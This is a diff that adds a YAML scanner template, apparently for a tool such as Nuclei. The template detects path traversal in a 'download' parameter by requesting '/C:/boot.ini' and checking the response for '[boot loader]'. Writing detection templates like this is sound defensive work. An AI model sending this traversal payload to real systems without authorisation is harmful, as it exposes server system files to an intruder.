@@ -1,0 +1,20 @@
+id: lfi6-0519
+name: 'Traversal in download'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via download'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      download:
+        - '/C:/boot.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[boot loader]'
